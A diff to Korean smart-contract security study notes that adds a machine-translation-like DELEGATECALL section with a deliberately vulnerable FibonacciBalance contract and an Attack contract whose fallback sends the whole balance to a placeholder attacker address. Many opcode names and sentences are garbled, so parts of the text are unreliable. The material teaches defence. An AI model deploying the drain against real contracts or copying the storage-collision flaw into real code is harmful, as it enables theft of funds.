@@ -1,5 +1,3 @@
-Now let’s look at the FibonacciBalance contract. Storage slot[0] now corresponds to the fibonacciLibrary address, and slot[1] corresponds to calculatedFibNumber. It is in this incorrect mapping that the vulnerability occurs. delegatecall preserves contract context. This means that code that is executed via delegatecall will act on the state (i.e., storage) of the calling contract.
-
 # Smart Contract Security
 스마트컨트랙트 프로그래밍에서 실수를 돌이킬 수 없는 결과를 만듦  
 본 챕터에서는 보안 최고 예제와 디자인 패턴, 보안 대응 패턴을 알아 볼 것임  
@@ -175,7 +173,7 @@ contract EtherStore {
  }
  ```
  
- ## Real-World Example: The DAO  
+## Real-World Example: The DAO  
  DAO(분산화된 자율 조직) 공격은 이더리움의 초기 개발단계에서 나타난 주요 공격중에 하나임  
  그 당시 컨트랙트는 150만 달러를 가지고 있었고, 재진입 공격 발생했다  
  그 결과로 하드포크가 일어나 이더리움 클래식으로 분화됨  
@@ -467,6 +465,121 @@ contract EtherGame {
 여기서 더 이상 this.balbance 를 사용하지 않음을 주의해서 보라  
 
 # DELEGATECALL
+CALL 및 DELEGECALL 오코드는 Ethereum 개발자가 코드를 모듈화할 수 있도록 하는 데 유용합니다.   
+계약에 대한 표준 외부 메시지 호출은 CALL opcode에 의해 처리되며, 여기서 코드는 외부 계약/함수의 컨텍스트에서 실행됩니다.   
+대상 주소에서 실행되는 코드가 호출 계약의 컨텍스트에서 실행되고 msg.sender 및 msg.value가 변경되지 않는다는 점을 제외하면 DELETECALL opcode는 거의 동일합니다.   
+이 기능은 라이브러리 구현을 가능하게 하여 개발자가 재사용 가능한 코드를 한 번 배포한 후 향후 계약에서 호출할 수 있도록 합니다.  
+
+이 두 오피코드 간의 차이는 간단하고 직관적이지만 DELADECALL을 사용하면 예기치 않은 코드가 실행될 수 있습니다.  
+
+자세한 내용은 Loi를 참조하십시오.이 주제와 Solidity 문서에 대한 Luu의 Ethereum Stack Exchange 질문입니다.  
+
+## The Vulnerability
+DELEGECALL의 컨텍스트 보존 특성으로 인해 취약성이 없는 사용자 지정 라이브러리를 구축하는 것은 생각보다 쉽지 않습니다.   
+라이브러리의 코드 자체는 안전하고 취약성이 없을 수 있지만 다른 응용 프로그램의 컨텍스트에서 실행될 경우 새로운 취약성이 발생할 수 있습니다. 피보나찌 숫자를 사용한 꽤 복잡한 예를 보자.
+
+FibonacchiLib.sol의 라이브러리를 고려하십시오.   
+이 라이브러리는 Fibonacchi 시퀀스와 유사한 형식의 시퀀스를 생성할 수 있습니다(참고: 이 코드는 https://bit.ly/2에서 수정되었습니다) 
+
+Example 6. FibonacciLib.sol  
+```
+// library contract - calculates Fibonacci-like numbers
+contract FibonacciLib {
+    // initializing the standard Fibonacci sequence
+    uint public start;
+    uint public calculatedFibNumber;
+
+    // modify the zeroth number in the sequence
+    function setStart(uint _start) public {
+        start = _start;
+    }
+
+    function setFibonacci(uint n) public {
+        calculatedFibNumber = fibonacci(n);
+    }
+
+    function fibonacci(uint n) internal returns (uint) {
+        if (n == 0) return start;
+        else if (n == 1) return start + 1;
+        else return fibonacci(n - 1) + fibonacci(n - 2);
+    }
+}
+```
+이 라이브러리는 시퀀스에서 n번째 피보나치 숫자를 생성할 수 있는 함수를 제공합니다.   
+사용자는 이 새 시퀀스에서 시퀀스의 시작 번호(시작)를 변경하고 n번째 Fibonacci 유사 숫자를 계산할 수 있습니다.
+
+이제 FibonacciBalance.sol에 나와 있는 이 라이브러리를 활용하는 계약을 고려해 보겠습니다.  
+Example 7. FibonacciBalance.sol  
+```
+contract FibonacciBalance {
+
+    address public fibonacciLibrary;
+    // the current Fibonacci number to withdraw
+    uint public calculatedFibNumber;
+    // the starting Fibonacci sequence number
+    uint public start = 3;
+    uint public withdrawalCounter;
+    // the Fibonancci function selector
+    bytes4 constant fibSig = bytes4(sha3("setFibonacci(uint256)"));
+
+    // constructor - loads the contract with ether
+    constructor(address _fibonacciLibrary) external payable {
+        fibonacciLibrary = _fibonacciLibrary;
+    }
+
+    function withdraw() {
+        withdrawalCounter += 1;
+        // calculate the Fibonacci number for the current withdrawal user-
+        // this sets calculatedFibNumber
+        require(fibonacciLibrary.delegatecall(fibSig, withdrawalCounter));
+        msg.sender.transfer(calculatedFibNumber * 1 ether);
+    }
+
+    // allow users to call Fibonacci library functions
+    function() public {
+        require(fibonacciLibrary.delegatecall(msg.data));
+    }
+}
+```
+이 계약은 참가자가 계약에서 에테르를 인출할 수 있도록 합니다. 즉, 첫 번째 참가자는 1 에테르를 받고, 두 번째 참가자는 1 에테르를 받고, 세 번째 참가자는 2 에테르를 받고, 네 번째 참가자는 3 에테르를 받고, 다섯 번째 5 등입니다. 인출되는 피보나치 번호보다 작습니다.)
+
+이 계약에는 설명이 필요할 수 있는 여러 요소가 있습니다. 첫째, fibSig라는 재미있게 생긴 변수가 있습니다. 여기에는 'setFibonacci(uint256)' 문자열의 Keccak-256(SHA-3) 해시의 처음 4바이트가 저장됩니다. 이를 함수 선택기라고 하며, 호출 데이터에 입력되어 스마트 계약의 호출 기능을 지정합니다.   
+이 기능은 라인 21의 대리자 통화 기능에 사용되어 피보나치(uint256) 기능을 실행하도록 지정합니다. delegatecall의 두 번째 인수는 함수에 전달할 매개 변수입니다.   
+둘째, 우리는 FibonacciLib 라이브러리의 주소가 생성자에서 올바르게 참조되고 있다고 가정한다(외부 계약 참조는 이러한 종류의 계약 참조 초기화와 관련된 몇 가지 잠재적 취약점을 논의한다).  
+이 계약서에서 오류를 발견할 수 있습니까? 이 계약을 배포하고 에테르를 채운 다음 전화를 끊는다면, 그것은 되돌아갈 것입니다.
+
+상태 변수 시작이 라이브러리와 주 호출 계약에서 모두 사용됨을 알 수 있습니다. 라이브러리 계약에서 시작은 Fibonacci 시퀀스의 시작을 지정하는 데 사용되며 호출 계약에서는 3으로 설정된 반면 0으로 설정됩니다. 또한 FibonacciBalance 계약의 폴백 기능을 통해 모든 호출을 라이브러리 계약으로 전달하여 라이브러리 계약의 setStart 기능을 호출할 수 있습니다. 계약 상태를 보존한다는 점을 상기하면, 이 기능을 통해 현지 Fibonnacci Balance 계약에서 시작 변수의 상태를 변경할 수 있습니다. 그러면 계산된 FibNumber는 시작 변수에 따라 달라지기 때문에(라이브러리 계약에서 보듯이) 더 많은 에테르를 인출할 수 있습니다. 실제로 setStart 함수는 FibonacciBalance 계약에서 시작 변수를 수정하지 않으며 수정할 수도 없습니다. 이 계약의 기본 취약성은 단순히 시작 변수를 수정하는 것보다 훨씬 더 심각합니다.  
+
+실제 문제에 대해 논의하기 전에 상태 변수가 실제로 계약에 어떻게 저장되는지 간단히 살펴보겠습니다. 상태 또는 스토리지 변수(개별 트랜잭션에 걸쳐 지속되는 변수)는 계약에 소개된 대로 순차적으로 슬롯에 배치됩니다. (여기에 몇 가지 복잡한 사항이 있습니다. 자세한 내용은 Solidity 문서를 참조하십시오.)
+
+예를 들어, 도서관 계약서를 살펴보자. 시작 및 계산된 FibNumber의 두 가지 상태 변수가 있습니다. 첫 번째 변수, 시작은 [0] 슬롯(즉, 첫 번째 슬롯)의 계약 저장소에 저장됩니다. 두 번째 변수, 계산된 FibNumber는 사용 가능한 다음 저장소 슬롯[1]에 배치됩니다. setStart 함수는 입력을 받아 입력을 무엇이든 start로 설정합니다. 따라서 이 함수는 슬롯[0]을 setStart 함수에 제공하는 모든 입력으로 설정합니다. 마찬가지로 설정된 Fibonacci 함수는 계산된 FibNumber를 fibonacci(n)의 결과로 설정합니다. 이는 저장 슬롯[1]을 fibonacci(n) 값으로 설정하기만 하면 됩니다.  
+
+이제 피보나치 밸런스 계약서를 봅시다. 이제 저장 슬롯[0]은 피보나치 라이브러리 주소에 해당하고 슬롯[1]은 계산된 FibNumber에 해당합니다. 이 잘못된 매핑에서 취약성이 발생합니다. delegatecall은 계약 컨텍스트를 보존합니다. 이는 대리자 호출을 통해 실행되는 코드가 호출 계약의 상태(즉, 저장소)에 따라 작동함을 의미합니다.
+
+21번 라인에서 인출 시 fibonaciLibrary.delegatecall(fibSig, 인출 카운터)을 실행합니다. 이렇게 하면 setFibonacci 함수가 호출됩니다. 이 함수는 앞서 설명한 대로 현재 컨텍스트에서 계산된 FibNumber 스토리지 슬롯[1]을 수정합니다. 이는 예상대로입니다(즉, 실행 후 계산된 FibNumber가 수정됨). 그러나 FibonacciLib 계약의 시작 변수는 현재 계약의 fibonaciLib 주소인 저장소 슬롯[0]에 있습니다. 이는 피보나찌 함수가 예상치 못한 결과를 준다는 것을 의미합니다. 이는 현재 호출 컨텍스트에서 fibonacciLibrary 주소(흔히 unt로 해석될 때 상당히 큰)인 start(슬롯[0])를 참조하기 때문입니다. 따라서 인출 기능은 계산된 FibNumber가 반환되는 unt(fibonacci Library) 양의 에테르를 포함하지 않기 때문에 되돌아갈 가능성이 높습니다.  
+더욱이 피보나치 밸런스 계약을 통해 사용자는 줄 26의 폴백 기능을 통해 모든 피보나치 라이브러리 기능을 호출할 수 있습니다. 앞에서 설명한 것처럼 setStart 기능도 포함되어 있습니다. 이 기능을 통해 누구나 스토리지 슬롯을 수정하거나 설정할 수 있습니다[0]. 이 경우 저장소 슬롯[0]은 피보나치 라이브러리 주소입니다. 따라서 공격자는 악의적인 계약을 만들고 주소를 unt로 변환한 다음 setStart(<attack_contract_address>,16)를 호출할 수 있습니다. 이렇게 하면 피보나치 라이브러리가 공격 계약의 주소로 변경됩니다. 그러면 사용자가 탈퇴나 폴백 기능을 호출할 때마다 fibonacchi Library의 실제 주소를 수정했기 때문에 악성 계약이 실행됩니다(계약 잔액 전체를 도용할 수 있음). 그러한 공격 계약의 예는 다음과 같다.  
+```
+contract Attack {
+    uint storageSlot0; // corresponds to fibonacciLibrary
+    uint storageSlot1; // corresponds to calculatedFibNumber
+
+    // fallback - this will run if a specified function is not found
+    function() public {
+        storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw
+        // is called we don't send out any ether
+        <attacker_address>.transfer(this.balance); // we take all the ether
+    }
+ }
+```
+이 공격 계약은 스토리지 슬롯[1]을 변경하여 계산된 Fib 번호를 수정합니다. 원칙적으로 공격자는 선택한 다른 스토리지 슬롯을 수정하여 이 계약에 대한 모든 종류의 공격을 수행할 수 있습니다. 이러한 계약을 리믹스에 넣고 딜러 통화 기능을 통해 다양한 공격 계약 및 상태 변경을 실험하는 것이 좋습니다.
+
+또한 Delegate 호출이 상태를 보존한다고 할 때 계약의 변수 이름이 아니라 해당 이름이 가리키는 실제 저장소 슬롯에 대해 이야기하는 것입니다. 이 예에서 볼 수 있듯이, 단순한 실수로 공격자가 전체 계약과 계약 에테르를 가로챌 수 있습니다.  
+
+## Preventative Techniques
+Solidity는 라이브러리 계약을 구현하기 위한 라이브러리 키워드를 제공합니다(자세한 내용은 문서 참조). 이렇게 하면 라이브러리 계약이 상태 비저장 상태이며 자체 파기할 수 없습니다. 라이브러리를 상태 비저장 상태로 강제로 지정하면 이 섹션에서 설명하는 스토리지 컨텍스트의 복잡성을 줄일 수 있습니다. 상태 비저장 라이브러리는 또한 공격자가 라이브러리의 코드에 종속된 계약에 영향을 미치기 위해 라이브러리 상태를 직접 수정하는 공격을 방지합니다. 일반적으로 DELEGECALL을 사용할 때는 라이브러리 계약과 호출 계약의 가능한 호출 컨텍스트에 주의하고 가능하면 상태 비저장 라이브러리를 빌드하십시오.  
+
+## Real-World Example: Parity Multisig Wallet (Second Hack)
+
 
 
 # Entropy Illusion
